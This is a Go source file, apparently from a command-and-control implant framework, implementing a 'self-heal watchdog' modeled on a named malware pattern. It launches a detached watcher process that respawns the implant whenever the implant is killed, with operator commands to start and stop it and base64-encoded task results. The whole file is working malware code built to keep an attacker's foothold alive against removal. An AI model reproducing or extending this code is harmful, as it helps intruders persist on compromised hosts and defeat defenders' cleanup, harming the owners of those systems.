//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Self-heal watchdog (the SilverFox/thumbs!Edge sibling-process pattern).
//
// watchdog_start launches a detached copy of this binary in watcher mode. The
// watcher polls the parent PID and, when the parent dies, starts a fresh copy
// of the implant, up to max_restarts. Exactly one watcher per agent: the state
// files are keyed by a hash of the persisted agent UUID, so a second
// watchdog_start (or a parent restarted by the watcher) sees the live PID and
// refuses to stack another watcher. watchdog_stop leaves a stop marker that the
// watcher removes itself after its next tick.
//
// The watcher is deliberately not persistent across reboots — the persistence
// modules own that — and it spawns the parent with the caller's environment
// minus the watchdog marker, so FORGEC2_* config survives the restart.

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const (
	watchdogDefaultInterval = 15 * time.Second
	watchdogMinInterval     = 5 * time.Second
	watchdogMaxInterval     = 5 * time.Minute
	watchdogDefaultRestarts = 10
	watchdogMaxRestarts     = 50
	watchdogEnvVersion      = "v1"
)

// watchdogStateDir is a variable so tests can point the marker files at a
// temp dir without touching the real one.
var watchdogStateDir = os.TempDir()

type watchdogParams struct {
	parentPID   int
	interval    time.Duration
	maxRestarts int
	token       string
}

// watchdogToken derives a stable per-agent suffix from the persisted UUID, so
// a parent restarted by the watcher uses the same state files.
func watchdogToken() string {
	sum := sha256.Sum256([]byte(agentUUID))
	return hex.EncodeToString(sum[:8])
}

func watchdogPaths(token string) (pidFile, stopFile string) {
	return filepath.Join(watchdogStateDir, "wd-"+token+".pid"),
		filepath.Join(watchdogStateDir, "wd-"+token+".stop")
}

// clampWatchdogParams bounds operator input: a too-short interval is a busy
// loop on the host, a too-large restart count is a fork bomb.
func clampWatchdogParams(intervalSec, maxRestarts int) (time.Duration, int) {
	interval := time.Duration(intervalSec) * time.Second
	if interval <= 0 {
		interval = watchdogDefaultInterval
	}
	if interval < watchdogMinInterval {
		interval = watchdogMinInterval
	}
	if interval > watchdogMaxInterval {
		interval = watchdogMaxInterval
	}
	if maxRestarts <= 0 {
		maxRestarts = watchdogDefaultRestarts
	}
	if maxRestarts > watchdogMaxRestarts {
		maxRestarts = watchdogMaxRestarts
	}
	return interval, maxRestarts
}

func formatWatchdogEnv(p watchdogParams) string {
	return fmt.Sprintf("%s|%d|%d|%d|%s", watchdogEnvVersion, p.parentPID,
		int(p.interval/time.Second), p.maxRestarts, p.token)
}

func parseWatchdogEnv(value string) (watchdogParams, bool) {
	parts := strings.Split(value, "|")
	if len(parts) != 5 || parts[0] != watchdogEnvVersion {
		return watchdogParams{}, false
	}
	parentPID, err := strconv.Atoi(parts[1])
	if err != nil || parentPID <= 0 {
		return watchdogParams{}, false
	}
	intervalSec, err := strconv.Atoi(parts[2])
	if err != nil {
		return watchdogParams{}, false
	}
	maxRestarts, err := strconv.Atoi(parts[3])
	if err != nil {
		return watchdogParams{}, false
	}
	token := strings.TrimSpace(parts[4])
	if len(token) != 16 {
		return watchdogParams{}, false
	}
	interval, maxRestarts := clampWatchdogParams(intervalSec, maxRestarts)
	return watchdogParams{parentPID: parentPID, interval: interval, maxRestarts: maxRestarts, token: token}, true
}

func watchdogEnvValue() (string, bool) {
	return os.LookupEnv(s(SWatchdogEnv))
}

func watchdogModeFromEnv() (watchdogParams, bool) {
	value, ok := watchdogEnvValue()
	if !ok {
		return watchdogParams{}, false
	}
	return parseWatchdogEnv(value)
}

// withoutWatchdogEnv copies the environment minus the watcher marker, which is
// what the watcher passes to the parent it spawns.
func withoutWatchdogEnv(env []string) []string {
	name := s(SWatchdogEnv) + "="
	out := make([]string, 0, len(env))
	for _, entry := range env {
		if strings.HasPrefix(entry, name) {
			continue
		}
		out = append(out, entry)
	}
	return out
}

func writeWatchdogPIDFile(token string, pid int) {
	pidFile, _ := watchdogPaths(token)
	_ = os.WriteFile(pidFile, []byte(strconv.Itoa(pid)), 0o600)
}

func readWatchdogPID(token string) int {
	pidFile, _ := watchdogPaths(token)
	data, err := os.ReadFile(pidFile)
	if err != nil {
		return 0
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(data)))
	if err != nil {
		return 0
	}
	return pid
}

func watchdogStopRequested(token string) bool {
	_, stopFile := watchdogPaths(token)
	_, err := os.Stat(stopFile)
	return err == nil
}

// watchdogOps is the loop's whole outside world, so the restart policy is
// tested without spawning anything.
type watchdogOps struct {
	alive         func(int) bool
	spawn         func() (int, error)
	stopRequested func() bool
	sleep         func(time.Duration)
}

// runWatchdogLoop returns the number of restarts it performed.
func runWatchdogLoop(p watchdogParams, ops watchdogOps) int {
	restarts := 0
	for {
		if ops.stopRequested() {
			return restarts
		}
		if ops.alive(p.parentPID) {
			ops.sleep(p.interval)
			continue
		}
		if restarts >= p.maxRestarts {
			return restarts
		}
		pid, err := ops.spawn()
		if err != nil {
			return restarts
		}
		restarts++
		p.parentPID = pid
		writeWatchdogPIDFile(p.token, pid)
	}
}

func spawnWatchdogParent() (int, error) {
	exe, err := os.Executable()
	if err != nil {
		return 0, err
	}
	cmd := exec.Command(exe)
	cmd.Env = withoutWatchdogEnv(os.Environ())
	detachWatchdogProcess(cmd)
	if err := cmd.Start(); err != nil {
		return 0, err
	}
	return cmd.Process.Pid, nil
}

func runWatchdogMode(p watchdogParams) {
	pidFile, stopFile := watchdogPaths(p.token)
	_ = os.WriteFile(pidFile, []byte(strconv.Itoa(os.Getpid())), 0o600)
	defer func() {
		_ = os.Remove(stopFile)
		_ = os.Remove(pidFile)
	}()
	ops := watchdogOps{
		alive:         watchdogProcessAlive,
		spawn:         spawnWatchdogParent,
		stopRequested: func() bool { return watchdogStopRequested(p.token) },
		sleep:         time.Sleep,
	}
	runWatchdogLoop(p, ops)
}

func watchdogArgs(command string) (time.Duration, int) {
	intervalSec, maxRestarts := 0, 0
	parts := strings.Split(strings.TrimSpace(command), ":")
	if len(parts) > 0 && strings.TrimSpace(parts[0]) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
			intervalSec = v
		}
	}
	if len(parts) > 1 && strings.TrimSpace(parts[1]) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
			maxRestarts = v
		}
	}
	return clampWatchdogParams(intervalSec, maxRestarts)
}

func handleWatchdogStart(task Task, res *TaskResult) {
	interval, maxRestarts := watchdogArgs(task.Command)
	token := watchdogToken()
	// A live watcher already covers this agent: never stack a second one.
	if pid := readWatchdogPID(token); pid > 0 && watchdogProcessAlive(pid) {
		res.Output = base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("watchdog already running (pid %d, interval %s, max_restarts %d)", pid, interval, maxRestarts)))
		res.Encoding = "base64"
		return
	}
	exe, err := os.Executable()
	if err != nil {
		res.Error = "watchdog: cannot resolve own executable: " + err.Error()
		return
	}
	params := watchdogParams{parentPID: os.Getpid(), interval: interval, maxRestarts: maxRestarts, token: token}
	cmd := exec.Command(exe)
	cmd.Env = append(withoutWatchdogEnv(os.Environ()), s(SWatchdogEnv)+"="+formatWatchdogEnv(params))
	cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, nil, nil
	detachWatchdogProcess(cmd)
	if err := cmd.Start(); err != nil {
		res.Error = "watchdog: start failed: " + err.Error()
		return
	}
	writeWatchdogPIDFile(token, cmd.Process.Pid)
	res.Output = base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("watchdog started (pid %d, interval %s, max_restarts %d)", cmd.Process.Pid, interval, maxRestarts)))
	res.Encoding = "base64"
}

func handleWatchdogStop(_ Task, res *TaskResult) {
	token := watchdogToken()
	_, stopFile := watchdogPaths(token)
	if err := os.WriteFile(stopFile, []byte("stop"), 0o600); err != nil {
		res.Error = "watchdog: cannot write stop marker: " + err.Error()
		return
	}
	res.Output = base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("watchdog stop requested (watcher pid %d)", readWatchdogPID(token))))
	res.Encoding = "base64"
}
